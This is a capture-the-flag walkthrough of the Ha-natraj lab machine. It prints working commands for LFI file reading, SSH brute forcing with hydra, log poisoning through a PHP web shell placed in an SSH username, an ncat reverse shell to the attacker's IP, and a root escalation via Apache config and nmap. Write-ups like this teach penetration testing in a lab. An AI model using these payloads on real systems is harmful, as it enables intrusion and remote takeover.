# Ha-natraj
### Enumeration
Ports 22 and 80 are open.

Running gobuster, we find a `/console` directory containing a `file.php`. I tried fuzzing for parameters using ffuf and the burp parameters wordlist in seclists (`?FUZZ=1`), but that didn't work. Thinking a little bit, I guessed that maybe the parameter was just `file`, and that the script would fetch file contents, so I tried `?file=/etc/passwd` and got back the contents of the server's `/etc/passwd` file!

I created a users wordlist using this file, and ran hydra, targeting SSH:

```shell-session
$ wget http://192.168.64.80/console/file.php?file=/etc/passwd -O passwd
$ grep bash passwd | cut -d: -f1 > users.txt
$ hydra -L users.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -Ifu ssh://192.168.64.80
```

Didn't get anything this way. Instead, I focussed on trying to get the contents of `file.php`. This was ultimately achieved using php filters:

```shell-session
$ curl 'http://192.168.61.80/console/file.php?file=php://filter/convert.base64-encode/resource=file.php' | base64 -d > file.php
```

The contents is:

```php
<?php
   $file = $_GET['file'];
   if(isset($file))
   {
       include("$file");
   }
   else
   {
       include("index.php");
   }
   ?>
```

So we've got a standard `include()`. I tried using `file=http://192.168.61.200/test.html`, but it doesn't appear that RFI is enabled by the PHP config, as no requests were made to the python webserver I spun up.

We assume that we're accessing files as the `www-data` user, so we check whether there's a flag in `/var/www/local.txt`, which there is!

### Foothold

Fuzzing with a variety of LFI wordlists, we discover we have access to `/var/log/auth.log`, which is the SSH log file. So we might be able to inject code into this log file by attempting to connect to SSH and injecting in the username. Then we can use the LFI to retrieve and execute the code.

Just to check we have control over input:

```shell-session
$ ssh test@192.168.53.80
$ curl http://192.168.53.80/console/file.php?file=/var/log/auth.log --output -
```

In the output, we see:

```
Mar 12 11:02:23 ubuntu sshd[886]: Invalid user test from 192.168.53.200 port 38090
Mar 12 11:02:23 ubuntu sshd[886]: pam_unix(sshd:auth): check pass; user unknown
Mar 12 11:02:23 ubuntu sshd[886]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.53.200
Mar 12 11:02:25 ubuntu sshd[886]: Failed password for invalid user test from 192.168.53.200 port 38090 ssh2
```

We see `test` and so hopefully we can inject a shell. Note that we're particular to use single quotes in the injected code, and as such the username is a bit messy to keep bash happy:

```shell-session
$ ssh '<?php echo system($_GET['"'cmd'"']); ?>'@192.168.62.80
$ curl http://192.168.53.80/console/file.php?file=/var/log/auth.log --output -
```

I ran curl just to check that code was being executed and saw:

```
Invalid user  from 192.168.53.200 port 38092
```

We see spaces where there should be a username. So code is being executed!

```shell-session
$ curl 'http://192.168.53.80/console/file.php?file=/var/log/auth.log&cmd=id' --output -

...

Invalid user uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Woop! So we'll get a reverse shell. Had to try a number of different reverse shells from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#ncat), in the end the one that worked was `ncat 192.168.53.200 9001 -e /bin/bash`:

```shell-session
$ curl 'http://192.168.62.80/console/file.php?file=/var/log/auth.log&cmd=ncat%20192.168.62.200%209001%20-e%20/bin/bash'
```

`nc` was on the machine, but I wasn't able to get any of the standard reverse shells to work.

### Privilege Escalation
Running `sudo -l`, we are able to start, stop and restart the Apache server.

Next, we check writable files:

```shell-session
$ find / -type f -writable 2>/dev/null | grep -v proc
```

We see `/etc/apache2/apache2.conf`. So maybe we can change the user and group in the config file and restart so that next time we execute the reverse shell we get a shell as a different user.

I tried this first as root, but the webserver failed to restart. Next I tried as `natraj`, however that user did not seem to have any obvious privesc paths. Lastly, `mahakal` had sudo privileges to run `nmap`, and looking on GTFO bins, we see we can get a root shell easily.